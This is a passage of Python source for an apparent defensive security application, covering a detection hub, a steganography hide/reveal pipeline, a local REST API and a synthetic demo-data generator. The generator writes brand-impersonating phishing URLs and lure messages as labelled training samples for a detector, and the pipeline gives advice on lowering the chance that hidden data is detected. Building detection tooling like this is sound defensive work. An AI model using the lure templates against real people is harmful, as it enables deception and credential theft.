                r = d["dlp"].analyze({"text": ev["msg"]})
                if r["score"] >= 50:
                    out.append(r)
        except Exception as e:
            self.counters["errors"] += 1
            self.bus.publish("error", {"where": "ingest", "error": f"{type(e).__name__}: {e}"[:200]})
        self.counters["events"] += 1
        return [self.emit(f, source) for f in out]

    def scan_file(self, path: str, source: str = "manual", emit: bool = True) -> dict:
        f = self.detectors["malware"].analyze_file(path)
        f["evidence"]["path"] = path
        if os.path.getsize(path) <= 5 << 20 and f["evidence"].get("type") in ("text", "script", "binary", "pdf", "zip"):
            try:
                g = self.detectors["dlp"].analyze_file(path)
                if g["score"] >= 50:
                    f["reasons"] = [r for r in f["reasons"] if not r.startswith("No malware")] + ["DLP: " + r for r in g["reasons"][:3]]
                    if int(g["score"] * 0.8) > f["score"]:
                        f["verdict"] = "sensitive data"
                    f["evidence"]["dlp"] = g["evidence"].get("counts")
                    f["score"] = max(f["score"], int(g["score"] * 0.8))
                    f["severity"] = sev_of(f["score"])
            except Exception:
                pass
        if emit:
            self.emit(f, source)
        return f

    # -- datasets & training -------------------------------------------
    def _didx(self) -> dict:
        try:
            with open(os.path.join(self.home, "datasets.json"), encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}

    def dataset_save(self, module: str, name: str, data: bytes) -> Table:
        if module not in self.detectors:
            raise KeyError(f"unknown module '{module}'")
        name = safe_name(name, "dataset.csv")
        t = load_table(data, name)
        if not len(t):
            raise ValueError("The file contains no rows I can read (supported: CSV, TSV, JSON, JSONL, plain log/text).")
        d = os.path.join(self.home, "datasets", module)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, name), "wb") as f:
            f.write(data)
        idx = self._didx()
        idx.setdefault(module, {})[name] = {**t.meta(), "uploaded": now()}
        with self._lk:
            with open(os.path.join(self.home, "datasets.json"), "w", encoding="utf-8") as f:
                json.dump(idx, f)
        self.bus.publish("dataset", {"module": module, "name": name, "rows": len(t)})
        if self.pg is not None:
            self.pg.put_dataset(module, name, data, t.meta())
        self.audit("dataset.uploaded", {"module": module, "name": name, "rows": len(t), "sha256": t.sha})
        return t

    def dataset_list(self, module: str | None = None) -> dict:
        idx = self._didx()
        if self.pg is not None and self.pg.connected:
            try:
                for m, ds in self.pg.list_datasets().items():
                    for k, v in ds.items():
                        idx.setdefault(m, {}).setdefault(k, v)
            except Exception:
                pass
        return idx.get(module, {}) if module else idx

    def dataset_load(self, module: str, name: str) -> Table:
        p = os.path.join(self.home, "datasets", module, safe_name(name))
        if not os.path.isfile(p) and self.pg is not None:
            blob = self.pg.get_dataset(module, safe_name(name))
            if blob is not None:
                return load_table(blob, safe_name(name))
        if not os.path.isfile(p):
            raise FileNotFoundError(f"dataset '{name}' not found for module '{module}'")
        with open(p, "rb") as f:
            return load_table(f.read(), os.path.basename(p))

    def train(self, module: str, dataset: str | Table, label=None, contamination=0.02) -> dict:
        t = dataset if isinstance(dataset, Table) else self.dataset_load(module, dataset)
        det = self.detectors[module]
        if not det.trainable:
            raise ValueError(f"'{module}' has no trainable model — use 'Analyze dataset' instead.")
        return det.train(t, label, contamination)

    def analyze_dataset(self, module: str, dataset: str | Table, emit=True, limit_emit=100) -> dict:
        t = dataset if isinstance(dataset, Table) else self.dataset_load(module, dataset)
        det = self.detectors[module]
        if module == "network" and t.fmt == "pcap":
            raise ValueError("use analyze_pcap")
        res = det.analyze_table(t)
        if emit:
            for f in res.get("findings", [])[:limit_emit]:
                if f["score"] >= int(self.setting("alert_threshold", 50)):
                    self.emit(f, f"dataset:{t.name}")
        return res

    def on_trained(self, det: Detector, info: dict, metrics: dict):
        rec = {"module": det.key, **{k: v for k, v in info.items()}, "metrics": {k: v for k, v in metrics.items() if k not in ("confusion", "per_class")}}
        with open(os.path.join(self.home, "models.jsonl"), "a", encoding="utf-8") as f:
            f.write(dumps(rec) + "\n")
        self.bus.publish("model", {"module": det.key, "kind": info.get("kind"), "dataset": info.get("dataset")})
        self.audit("model.trained", {"module": det.key, "kind": info.get("kind"), "dataset": info.get("dataset"), "rows": info.get("rows"),
                                     "model_sha256": info.get("model_sha256")})
        self.seal_async("AI_MODEL", {"file_sha256": info.get("model_sha256") or info.get("sha256") or sha256s(dumps(rec)),
                                     "name": f"{det.key} model", "ai": {"module": det.key, "kind": info.get("kind"), "dataset_sha256": info.get("sha256"),
                                                                       "rows": info.get("rows"), "metrics": {k: v for k, v in metrics.items() if isinstance(v, (int, float))}}})

    # -- secure-flow helpers (used by the desktop app AND the API) ------
    def pre_hide(self, message: str, cover_path: str) -> dict:
        warnings, decision = [], "allow"
        dlp = self.detectors["dlp"].analyze({"text": message})
        if dlp["score"] >= 50:
            warnings.append("Message contains sensitive data: " + "; ".join(dlp["reasons"][:3]))
            decision = "warn"
        ph = None
        if IOC_RES["url"].search(message):
            ph = self.detectors["phishing"].analyze({"text": message})
            if ph["score"] >= 50:
                warnings.append("Message contains a link that looks like phishing")
                decision = "warn"
        cover = self.detectors["malware"].analyze_file(cover_path)
        cover["evidence"]["path"] = cover_path
        if cover["score"] >= 75:
            warnings.append("The cover file looks malicious: " + cover["reasons"][0])
            decision = "block" if self.setting("block_malicious_cover", True) else "warn"
            self.emit(cover, "pipeline:cover")
        elif cover["score"] >= 40:
            warnings.append("Cover file is suspicious: " + cover["reasons"][0])
        st = (cover["evidence"].get("steganalysis") or {})
        if st.get("run_windows", 0) >= 1 and not st.get("cryptosec_header") and not st.get("inconclusive"):
            warnings.append("The cover image already appears to carry hidden data — embedding will overwrite it.")
        if st.get("cryptosec_header"):
            warnings.append("The cover already holds a CryptoSec message — hiding again will overwrite it.")
        return {"decision": decision, "warnings": warnings, "dlp": dlp, "phishing": ph, "cover": cover}

    def post_hide(self, out_path: str, payload_bytes: int) -> dict:
        kind = "video" if os.path.splitext(out_path.lower())[1] in VID_EXT_AI else "image"
        st = steg_video(out_path) if kind == "video" else steg_image(out_path)
        if "error" in st:
            return {"detectability": None, "note": st["error"]}
        if st.get("inconclusive"):
            return {"detectability": 15, "p_value_max": None, "estimated_payload_bytes": None, "cover_fill_ratio": None,
                    "advice": "Noisy cover: LSB statistics look random everywhere, so a chi-square test cannot single out the hidden data."}
        samples = max(st.get("samples", 1), 1)
        fill = min(1.0, payload_bytes * 8 / samples)
        det = 10 if st["run_windows"] == 0 else int(clamp(0.45 + 0.08 * st["run_windows"], 0, 0.95) * 100)
        advice = ("Below the resolution of the LSB chi-square test (small message in a large cover) — good." if det < 30 else
                  "A windowed chi-square steganalysis test can see the embedded prefix; a larger or noisier cover shrinks the footprint.")
        return {"detectability": det, "p_value_max": st["p_max"], "estimated_payload_bytes": st.get("est_payload_bytes"),
                "cover_fill_ratio": round(fill, 5), "advice": advice}

    @staticmethod
    def ai_summary(pre: dict, post: dict, extra: dict | None = None) -> dict:
        c = pre["cover"]
        risk = max(c["score"], pre["dlp"]["score"] if pre["dlp"]["score"] >= 50 else 0, (post or {}).get("detectability") or 0)
        return {"v": 1, "engine": f"cryptosec-ai/{AI_VERSION}", "decision": pre["decision"], "risk": int(risk),
                "cover": {"verdict": c["verdict"], "score": c["score"]},
                "dlp": {"hits": sum((pre["dlp"]["evidence"].get("counts") or {}).values()), "types": sorted((pre["dlp"]["evidence"].get("counts") or {}))[:6]},
                "stego_detectability": (post or {}).get("detectability"), **(extra or {})}

    def pre_reveal(self, path: str) -> dict:
        if self.lock_remaining("reveal"):
            return {"locked": self.lock_remaining("reveal"), "warnings": ["Reveal is temporarily locked by incident response."], "scan": None}
        f = self.detectors["malware"].analyze_file(path)
        w = [f"File scan: {f['reasons'][0]}"] if f["score"] >= 40 else []
        if f["score"] >= 75:
            self.emit(f, "pipeline:reveal")
        return {"locked": 0, "warnings": w, "scan": f}

    def post_reveal(self, plain: str) -> dict:
        w = []
        dlp = self.detectors["dlp"].analyze({"text": plain})
        if dlp["score"] >= 50:
            w.append("The message contains sensitive data: " + "; ".join(dlp["reasons"][:3]))
        ph = None
        if IOC_RES["url"].search(plain) or re.search(r"(?i)\b(verify|password|login)\b", plain):
            ph = self.detectors["phishing"].analyze({"text": plain})
            if ph["score"] >= 50:
                w.append("⚠ The message contains phishing-style content/links — do not click or log in.")
        return {"warnings": w, "dlp": dlp, "phishing": ph}

    def record_op(self, kind: str, ok: bool, size: int = 0, resource: str = "") -> list:
        """Feed the app's own activity to UBA + password-attack detection (wrong passphrases = guessing)."""
        ev = {"ts": now(), "user": self.actor, "src_ip": "local", "action": kind, "resource": resource[:60], "success": ok,
              "bytes": float(size), "device": "cryptosec", "raw": {}}
        fs = []
        if kind == "reveal":
            fs += self.detectors["password"].observe(ev)
        fs += self.detectors["uba"].observe(ev)
        return [self.emit(f, "app") for f in fs]

    # -- overview -------------------------------------------------------
    def status(self) -> dict:
        c = self.alerts.counts(24)
        reg = self.detectors["risk"].register()
        return {"version": AI_VERSION, "alerts_24h": c, "risk": {"org_risk": reg["org_risk"], "posture": reg["posture"], "counts": reg["counts"]},
                "models_trained": [k for k, d in self.detectors.items() if d.model or d.trained_on], "monitor": self.monitor.status(),
                "open_cases": len(self.ir.list("open")), "blocked_ips": len(self.ips.list()), "iocs": len(self.ti.iocs),
                "ioc_hashes": len(self.ioc_hashes), "ir_mode": self.setting("ir_mode"), "counters": dict(self.counters),
                "pending_seals": len(self.pending_seals), "llm_enabled": self.llm.enabled(),
                "database": ({"mode": self.pg.mode, "connected": self.pg.connected, "pending_writes": self.pg.pending(), "last_error": self.pg.last_error}
                             if self.pg is not None else {"mode": "off", "error": self.pg_error})}

    def shutdown(self):
        self.monitor.stop()
        self.ti.save()
        if self.pg is not None:
            try:
                self.audit("hub.shutdown", {})
                self._audit_ex.submit(lambda: None).result(5)
                if self._audit_n:
                    self.anchor_audit()
            except Exception:
                pass
            self.disconnect_pg()


VID_EXT_AI = {".mp4", ".avi", ".mkv", ".mov", ".webm", ".m4v", ".wmv"}


# ═══════════════════════════════════════════════════════════════════════
#  REST API  (stdlib only · localhost by default · bearer-token auth)
# ═══════════════════════════════════════════════════════════════════════
class ApiServer:
    MAX_BODY = 128 << 20

    def __init__(self, hub: AIHub, ops: dict | None = None):
        self.hub, self.ops = hub, ops or {}
        self.httpd: ThreadingHTTPServer | None = None
        self.th: threading.Thread | None = None
        self.port = 0
        self.hits: dict = collections.defaultdict(collections.deque)
        self.fails: dict = collections.defaultdict(collections.deque)
        self.routes: list = []
        self._routes()

    # -- route table -----------------------------------------------------
    def _r(self, method, pattern, fn, summary, auth=True):
        self.routes.append((method, re.compile("^" + re.sub(r"\{(\w+)\}", r"(?P<\1>[^/]+)", pattern) + "$"), pattern, fn, summary, auth))

    def _routes(self):
        r, h = self._r, self.hub
        r("GET", "/api/v1/health", lambda q, b, p: {"ok": True, "service": "cryptosec-ai", "version": AI_VERSION}, "Liveness probe", auth=False)
        r("GET", "/api/v1/status", lambda q, b, p: h.status(), "Overall system status, risk posture, counters")
        r("GET", "/api/v1/modules", lambda q, b, p: [d.info() for d in h.detectors.values()], "List the 19 AI security modules")
        r("GET", "/api/v1/modules/{key}", lambda q, b, p: self._det(p["key"]).info(), "Describe one module")
        r("POST", "/api/v1/detect/{key}", self._detect, "Analyse one item with a module  {input, emit?}")
        r("GET", "/api/v1/datasets", lambda q, b, p: h.dataset_list(), "List uploaded datasets")
        r("GET", "/api/v1/datasets/{key}", lambda q, b, p: h.dataset_list(p["key"]), "Datasets of one module")
        r("POST", "/api/v1/datasets/{key}", self._upload, "Upload a dataset (raw body CSV/JSON/JSONL/log) ?name=&train=1&analyze=1&label=")
        r("POST", "/api/v1/train/{key}", self._train, "Train a module on an uploaded dataset  {dataset, label?, contamination?}")
        r("POST", "/api/v1/analyze/{key}", self._analyze_ds, "Analyse a whole dataset  {dataset}")
        r("POST", "/api/v1/scan/file", self._scan_file, "Scan a file (raw body, ?name=) — malware + DLP + steganalysis")
        r("POST", "/api/v1/pcap", self._pcap, "Analyse a classic .pcap (raw body)")
        r("GET", "/api/v1/alerts", self._alerts, "Recent alerts ?since=&min_severity=&module=&limit=")
        r("GET", "/api/v1/stream", None, "Server-Sent Events stream of alerts / cases / sealed blocks")
        r("GET", "/api/v1/monitor", lambda q, b, p: h.monitor.status(), "Real-time monitor status")
        r("POST", "/api/v1/monitor/start", lambda q, b, p: h.monitor.start(self._js(b).get("sources", [])), "Start monitor {sources:[{path}]}")
        r("POST", "/api/v1/monitor/stop", lambda q, b, p: (h.monitor.stop(), h.monitor.status())[1], "Stop monitor")
        r("POST", "/api/v1/ingest", self._ingest, "Push events/log lines into the live pipeline {events:[…]} or {lines:[…]}")
        r("GET", "/api/v1/cases", lambda q, b, p: h.ir.list(q.get("status")), "Incident cases ?status=open")
        r("POST", "/api/v1/cases/{cid}/execute", lambda q, b, p: h.ir.execute(p["cid"]), "Execute a case's planned steps (safe, in-app actions)")
        r("POST", "/api/v1/cases/{cid}/close", lambda q, b, p: h.ir.close(p["cid"], self._js(b).get("resolution", "resolved")), "Close a case")
        r("POST", "/api/v1/respond", lambda q, b, p: h.ir.open_case(self._js(b)["finding"]), "Open a case for a finding {finding}")
        r("GET", "/api/v1/ips/blocklist", lambda q, b, p: h.ips.list(), "Active in-app blocklist")
        r("POST", "/api/v1/ips/block", lambda q, b, p: h.ips.block(self._js(b)["ip"], int(self._js(b).get("ttl", 3600)), self._js(b).get("reason", "api")), "Block an IP (in-app)")
        r("POST", "/api/v1/ips/unblock", lambda q, b, p: {"removed": h.ips.unblock(self._js(b)["ip"])}, "Unblock an IP")
        r("GET", "/api/v1/intel", lambda q, b, p: h.ti.query(int(q.get("min_confidence", 0)), q.get("type"), int(q.get("limit", 500))), "Threat-intel indicators")
        r("GET", "/api/v1/intel/stix", lambda q, b, p: h.ti.export_stix(int(q.get("min_confidence", 40))), "STIX 2.1 bundle")
        r("GET", "/api/v1/intel/csv", lambda q, b, p: ("text/csv", h.ti.export_csv(int(q.get("min_confidence", 0)))), "IOC CSV export")
        r("GET", "/api/v1/intel/blocklist", lambda q, b, p: ("text/plain", "\n".join(h.ti.blocklist(int(q.get("min_confidence", 70))))), "Plain IP blocklist")
        r("GET", "/api/v1/intel/report", lambda q, b, p: {"report": h.ti.report(int(q.get("hours", 24)), q.get("ai") == "1")}, "Generated intelligence summary ?hours=&ai=1")
        r("GET", "/api/v1/risk", lambda q, b, p: h.detectors["risk"].register(), "Ranked risk register")
        r("GET", "/api/v1/predict", lambda q, b, p: h.detectors["predict"].from_alerts(), "Forecast alert volume from this system's history")
        r("POST", "/api/v1/vuln/scan", lambda q, b, p: h.detectors["vuln"].scan(self._js(b).get("host", "127.0.0.1"), self._js(b).get("ports")), "Connect-scan a loopback/private host")
        r("POST", "/api/v1/dlp/redact", lambda q, b, p: dict(zip(("text", "matches"), h.detectors["dlp"].redact(self._js(b)["text"]))), "Redact sensitive data from text")
        r("POST", "/api/v1/password/audit", lambda q, b, p: password_audit(self._js(b)["password"], self._js(b).get("username", "")), "Local password-strength audit (not stored)")
        r("POST", "/api/v1/pipeline/hide", self._p_hide, "Full pipeline: AI pre-scan → encrypt → hide in image/video → blockchain seal → AI summary")
        r("POST", "/api/v1/pipeline/reveal", self._p_reveal, "Full pipeline: AI file scan → ledger trust check → decrypt → AI content scan")
        r("POST", "/api/v1/pipeline/verify", self._p_verify, "Authenticity + AI scan of a file {file_b64}")
        r("GET", "/api/v1/ledger", lambda q, b, p: self._op("ledger")(), "Blockchain ledger summary")
        r("GET", "/api/v1/ledger/validate", lambda q, b, p: self._op("validate")(), "Re-validate the whole chain")
        r("POST", "/api/v1/explain", lambda q, b, p: {"explanation": h.llm.explain(self._js(b)["finding"])}, "Plain-language explanation of a finding (optional LLM)")
        r("GET", "/api/v1/settings", lambda q, b, p: {k: ("***" if k == "llm_api_key" and v else v) for k, v in h.cfg.items()}, "Read AI settings")
        r("POST", "/api/v1/settings", self._settings, "Change AI settings {key: value}")
        r("GET", "/api/v1/db/status", lambda q, b, p: self._pg().status(), "PostgreSQL status: version, size, row counts, write queue")
        r("GET", "/api/v1/db/analytics", lambda q, b, p: self._pg().analytics(int(q.get("days", 14))), "SQL analytics ?days=: alerts/day, top entities, ATT&CK, MTTR")
        r("GET", "/api/v1/db/ledger/search", self._db_search, "Query the blockchain mirror ?type=&file_sha256=&signer=&since=&limit=")
        r("GET", "/api/v1/db/ledger/verify", lambda q, b, p: self._op("mirror_verify")(), "Cross-check the SQL mirror against the authoritative chain")
        r("GET", "/api/v1/db/audit", lambda q, b, p: self._pg().audit_tail(int(q.get("limit", 100))), "Tail of the hash-chained audit log")
        r("GET", "/api/v1/db/audit/verify", lambda q, b, p: self._op("audit_verify")(), "Verify the audit hash chain and its blockchain anchors")
        r("POST", "/api/v1/db/anchor", lambda q, b, p: (self._pg(), self.hub.anchor_audit())[1], "Seal the audit-log head hash on the blockchain")
        r("POST", "/api/v1/db/import", lambda q, b, p: (self._pg(), self.hub.pg_import_local())[1], "Import local files into PostgreSQL (idempotent)")
        r("POST", "/api/v1/db/backup", self._db_backup, "pg_dump backup of the cryptosec schema (written under the data folder)")
        r("GET", "/api/v1/openapi.json", lambda q, b, p: self.openapi(), "OpenAPI 3 description", auth=False)
        r("GET", "/api/v1/docs", None, "Human-readable endpoint list", auth=False)

    # -- helpers ---------------------------------------------------------
    def _det(self, k):
        if k not in self.hub.detectors:
            raise KeyError(f"unknown module '{k}'")
        return self.hub.detectors[k]

    @staticmethod
    def _js(b: bytes) -> dict:
        try:
            o = json.loads(b.decode("utf-8") or "{}")
        except ValueError:
            raise ValueError("body must be valid JSON")
        if not isinstance(o, dict):
            raise ValueError("body must be a JSON object")
        return o

    def _op(self, name):
        if name not in self.ops:
            raise NotImplementedError(f"'{name}' is not available in this server mode")
        return self.ops[name]

    def _detect(self, q, b, p):
        o = self._js(b)
        if "input" not in o:
            raise ValueError("JSON body needs an 'input' field")
        return self.hub.analyze(p["key"], o["input"], emit=bool(o.get("emit", True)), source="api")

    def _upload(self, q, b, p):
        name = q.get("name") or "upload.csv"
        t = self.hub.dataset_save(p["key"], name, b)
        out = {"dataset": t.meta()}
        if q.get("train") in ("1", "true"):
            out["train"] = self.hub.train(p["key"], t, q.get("label"), float(q.get("contamination", 0.02)))
        if q.get("analyze") in ("1", "true"):
            res = self.hub.analyze_dataset(p["key"], t)
            out["analysis"] = {k: v for k, v in res.items() if k != "findings"}
            out["analysis"]["top_findings"] = res.get("findings", [])[:10]
        return out

    def _train(self, q, b, p):
        o = self._js(b)
        return self.hub.train(p["key"], o["dataset"], o.get("label"), float(o.get("contamination", 0.02)))

    def _analyze_ds(self, q, b, p):
        o = self._js(b)
        return self.hub.analyze_dataset(p["key"], o["dataset"], emit=bool(o.get("emit", True)))

    def _scan_file(self, q, b, p):
        if not b:
            raise ValueError("send the file as the raw request body")
        with tempfile.TemporaryDirectory() as td:
            path = os.path.join(td, safe_name(q.get("name"), "upload.bin"))
            with open(path, "wb") as f:
                f.write(b)
            f = self.hub.scan_file(path, "api")
            f["evidence"].pop("path", None)
            return f

    def _pcap(self, q, b, p):
        res = self.hub.detectors["network"].analyze_pcap(b)
        for f in res["findings"][:100]:
            self.hub.emit(f, "pcap")
        return res

    def _alerts(self, q, b, p):
        return {"alerts": self.hub.alerts.recent(min(int(q.get("limit", 100)), 1000), q.get("min_severity", "info"), q.get("module"), float(q.get("since", 0))),
                "now": now()}

    def _ingest(self, q, b, p):
        o = self._js(b)
        fs = []
        for ln in (o.get("lines") or [])[:5000]:
            e = parse_log_line(str(ln))
            if e:
                fs += self.hub.ingest(e, "api")
        for r in (o.get("events") or [])[:5000]:
            e = norm_event({nk(k): v for k, v in r.items()})
            e.setdefault("msg", dumps(r)[:300])
            fs += self.hub.ingest(e, "api")
        return {"findings": fs, "count": len(fs)}

    def _tmp_from_b64(self, td, b64, name):
        raw = base64.b64decode(b64, validate=False)
        path = os.path.join(td, safe_name(name, "file.bin"))
        with open(path, "wb") as f:
            f.write(raw)
        return path

    def _p_hide(self, q, b, p):
        o = self._js(b)
        for k in ("cover_b64", "message", "secret"):
            if not o.get(k):
                raise ValueError(f"missing '{k}'")
        with tempfile.TemporaryDirectory() as td:
            cover = self._tmp_from_b64(td, o["cover_b64"], o.get("cover_name", "cover.png"))
            res = self._op("hide")(cover, o["message"], o.get("cipher", "aes"), o["secret"], o.get("dlp_policy", self.hub.setting("dlp_policy", "warn")),
                                   bool(o.get("seal", True)))
            if res.get("output_path"):
                with open(res["output_path"], "rb") as f:
                    res["stego_b64"] = base64.b64encode(f.read()).decode()
                res["stego_name"] = os.path.basename(res.pop("output_path"))
            return res

    def _p_reveal(self, q, b, p):
        o = self._js(b)
        with tempfile.TemporaryDirectory() as td:
            path = self._tmp_from_b64(td, o["file_b64"], o.get("file_name", "stego.png"))
            return self._op("reveal")(path, o["secret"])

    def _p_verify(self, q, b, p):
        o = self._js(b)
        with tempfile.TemporaryDirectory() as td:
            path = self._tmp_from_b64(td, o["file_b64"], o.get("file_name", "file.bin"))
            return self._op("verify")(path)

    def _pg(self):
        p = self.hub.pg
        if p is None or not p.connected:
            raise NotImplementedError("PostgreSQL is not enabled (desktop: API & settings → Database, or set CRYPTOSEC_PG_DSN)")
        return p

    def _db_search(self, q, b, p):
        return self._pg().search_txs(q.get("type"), q.get("file_sha256"), q.get("signer"), float(q["since"]) if q.get("since") else None,
                                     int(q.get("limit", 100)))

    def _db_backup(self, q, b, p):
        d = os.path.join(self.hub.home, "backups")
        os.makedirs(d, exist_ok=True)
        return self._pg().backup(os.path.join(d, f"cryptosec_{int(now())}.dump"))

    def _settings(self, q, b, p):
        o = self._js(b)
        for k, v in o.items():
            if k in ("api_host", "api_port", "api_allow_remote", "api_autostart", "pg_mode", "pg_dsn"):
                raise ValueError(f"'{k}' can only be changed in the desktop app")
            self.hub.set_setting(k, v)
        return {"ok": True, "changed": list(o)}

    def openapi(self) -> dict:
        paths: dict = {}
        for m, _, pat, _, summ, auth in self.routes:
            ps = [{"name": x, "in": "path", "required": True, "schema": {"type": "string"}} for x in re.findall(r"\{(\w+)\}", pat)]
            op = {"summary": summ, "parameters": ps, "responses": {"200": {"description": "OK"}}}
            if auth:
                op["security"] = [{"bearer": []}]
            paths.setdefault(pat, {})[m.lower()] = op
        return {"openapi": "3.0.3", "info": {"title": "CryptoSec AI API", "version": AI_VERSION,
                                             "description": "Local security-intelligence API. Authenticate with  Authorization: Bearer <api key>."},
                "components": {"securitySchemes": {"bearer": {"type": "http", "scheme": "bearer"}}}, "paths": paths}

    # -- server ----------------------------------------------------------
    def start(self, host: str = "127.0.0.1", port: int = 8765) -> int:
        if self.httpd:
            return self.port
        if host not in ("127.0.0.1", "localhost", "::1") and not self.hub.setting("api_allow_remote", False):
            raise PermissionError("Remote binding is disabled. Enable 'api_allow_remote' (and put TLS in front) to listen beyond localhost.")
        api = self

        class H(BaseHTTPRequestHandler):
            server_version = "CryptoSecAPI/" + AI_VERSION
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):
                pass

            def _send(self, code, body: bytes, ctype="application/json; charset=utf-8", extra=None):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store")
                self.send_header("X-Content-Type-Options", "nosniff")
                for k, v in (extra or {}).items():
                    self.send_header(k, v)
                self.end_headers()
                self.wfile.write(body)

            def _json(self, code, obj):
                self._send(code, dumps(obj).encode())

            def _auth_ok(self) -> bool:
                tok = ""
                a = self.headers.get("Authorization", "")
                if a.lower().startswith("bearer "):
                    tok = a[7:].strip()
                tok = tok or self.headers.get("X-API-Key", "")
                return hmac.compare_digest(tok.encode(), api.hub.api_key.encode())

            def _handle(self, method):
                ip = self.client_address[0]
                t = time.time()
                hq = api.hits[ip]
                hq.append(t)
                while hq and hq[0] < t - 60:
                    hq.popleft()
                fq = api.fails[ip]
                while fq and fq[0] < t - 300:
                    fq.popleft()
                if len(hq) > 600 or len(fq) >= 10:
                    return self._json(429, {"error": "rate limit — slow down"})
                u = urllib.parse.urlsplit(self.path)
                q = {k: v[0] for k, v in urllib.parse.parse_qs(u.query).items()}
                for m, rx, pat, fn, summ, auth in api.routes:
                    mm = rx.match(u.path) if m == method else None
                    if not mm:
                        continue
                    if auth and not self._auth_ok():
                        fq.append(t)
                        return self._json(401, {"error": "missing or invalid API key (use  Authorization: Bearer <key>)"})
                    origin = self.headers.get("Origin")
                    if origin and urllib.parse.urlsplit(origin).hostname not in ("127.0.0.1", "localhost", "::1"):
                        return self._json(403, {"error": "cross-origin requests are not allowed"})
                    n = int(self.headers.get("Content-Length") or 0)
                    if n > api.MAX_BODY:
                        return self._json(413, {"error": "body too large"})
                    body = self.rfile.read(n) if n else b""
                    try:
                        if pat.endswith("/stream"):
                            return self._sse()
                        if pat.endswith("/docs"):
                            return self._send(200, api.docs_html().encode(), "text/html; charset=utf-8")
                        res = fn(q, body, mm.groupdict())
                        if isinstance(res, tuple) and len(res) == 2 and isinstance(res[0], str):
                            return self._send(200, res[1].encode(), res[0] + "; charset=utf-8")
                        return self._json(200, res)
                    except KeyError as e:
                        return self._json(404, {"error": f"not found: {e}"})
                    except (ValueError, FileNotFoundError, json.JSONDecodeError) as e:
                        return self._json(400, {"error": str(e)})
                    except NotImplementedError as e:
                        return self._json(501, {"error": str(e)})
                    except PermissionError as e:
                        return self._json(403, {"error": str(e)})
                    except Exception as e:
                        return self._json(503 if (cpg is not None and isinstance(e, cpg.PgUnavailable)) else 500,
                                          {"error": f"{type(e).__name__}: {e}"[:300]})
                self._json(404, {"error": "no such endpoint — see /api/v1/docs"})

            def _sse(self):
                self.send_response(200)
                for k, v in (("Content-Type", "text/event-stream"), ("Cache-Control", "no-store"), ("Connection", "close")):
                    self.send_header(k, v)
                self.end_headers()
                seq = api.hub.bus.seq
                try:
                    self.wfile.write(b": connected\n\n")
                    self.wfile.flush()
                    while api.httpd is not None:
                        if api.hub.bus.wait(seq, 10.0):
                            for it in api.hub.bus.since(seq, 200, ("alert", "case", "sealed", "monitor", "model", "lock")):
                                self.wfile.write(f"event: {it['kind']}\ndata: {dumps(it)}\n\n".encode())
                            seq = api.hub.bus.seq
                        else:
                            self.wfile.write(b": keep-alive\n\n")
                        self.wfile.flush()
                except (BrokenPipeError, ConnectionResetError, OSError):
                    pass
                self.close_connection = True

            def do_GET(self):
                self._handle("GET")

            def do_POST(self):
                self._handle("POST")

        self.httpd = ThreadingHTTPServer((host, port), H)
        self.httpd.daemon_threads = True
        self.port = self.httpd.server_address[1]
        self.th = threading.Thread(target=self.httpd.serve_forever, daemon=True, name="cs-api")
        self.th.start()
        self.hub.bus.publish("api", {"state": "started", "port": self.port})
        return self.port

    def stop(self):
        h, self.httpd = self.httpd, None
        if h:
            h.shutdown()
            h.server_close()
            self.hub.bus.publish("api", {"state": "stopped"})

    def docs_html(self) -> str:
        rows = "".join(f"<tr><td><b>{m}</b></td><td><code>{pat}</code></td><td>{summ}</td><td>{'🔑' if a else ''}</td></tr>"
                       for m, _, pat, _, summ, a in self.routes)
        return ("<!doctype html><meta charset=utf-8><title>CryptoSec AI API</title><style>body{font:14px system-ui;margin:2rem;background:#0b0d12;color:#e6eaf2}"
                "td,th{padding:.35rem .8rem;border-bottom:1px solid #262c3b;text-align:left}code{color:#22d3ee}</style>"
                f"<h2>CryptoSec AI API v{AI_VERSION}</h2><p>Send <code>Authorization: Bearer &lt;your key&gt;</code>. "
                "Machine-readable spec: <a href=openapi.json style=color:#22d3ee>openapi.json</a></p><table><tr><th>Method<th>Path<th>What it does<th></tr>" + rows + "</table>")


# ═══════════════════════════════════════════════════════════════════════
#  SYNTHETIC DEMO DATA  (clearly fake — for trying the upload/train/detect flow)
# ═══════════════════════════════════════════════════════════════════════
def generate_demo_data(folder: str, seed: int = 7) -> dict:
    """Write one synthetic sample dataset per module into `folder`. Returns {module: filename}."""
    import random
    R = random.Random(seed)
    os.makedirs(folder, exist_ok=True)
    out: dict = {}

    def wcsv(mod, name, header, rows):
        with open(os.path.join(folder, name), "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(header)
            w.writerows(rows)
        out[mod] = name

    words = ["blog", "shop", "news", "photo", "travel", "recipe", "garden", "music", "forum", "sport", "tech", "school", "health", "books", "cars"]
    brands = ["paypal", "apple", "microsoft", "amazon", "netflix", "dhl", "binance", "google"]
    kws = ["login", "verify", "secure", "update", "account", "confirm", "signin", "billing"]
    tlds = ["tk", "xyz", "top", "click", "ml", "ga"]
    rows = []
    for _ in range(700):
        if R.random() < .35:
            style = R.randint(0, 3)
            b, k, t = R.choice(brands), R.choice(kws), R.choice(tlds)
            u = [f"http://{b}-{k}.{R.choice(words)}{R.randint(1, 99)}.{t}/{k}/index.php?id={R.randint(1000, 99999)}",
                 f"http://{R.randint(11, 220)}.{R.randint(0, 255)}.{R.randint(0, 255)}.{R.randint(1, 254)}/{b}/{k}.html",
                 f"https://{k}.{b}.com.{R.choice(words)}-{R.choice(words)}.{t}/webscr?cmd=_{k}",
                 f"http://{b}{R.randint(10, 99)}-support.{t}/{k}-account/confirm"][style]
            txt = R.choice(["Your account has been suspended. Verify your account within 24 hours: " + u, "Unusual sign-in activity. Click here to confirm your identity: " + u, ""])
            rows.append([u, txt, "phishing"])
        else:
            d = f"{R.choice(words)}{R.choice(words)}.{R.choice(['com', 'org', 'net', 'edu'])}"
            u = f"https://www.{d}/{R.choice(words)}/{R.choice(words)}-{R.randint(1, 500)}"
            rows.append([u, R.choice(["Meeting notes attached, see you Monday.", "Here is the article I mentioned: " + u, ""]), "legit"])
    wcsv("phishing", "phishing_sample.csv", ["url", "text", "label"], rows)

    spam_t = ["WINNER!! You have won a FREE prize of $1000. Call now to claim your cash!!!", "Congratulations! Click below to claim your free gift card. Limited time offer",
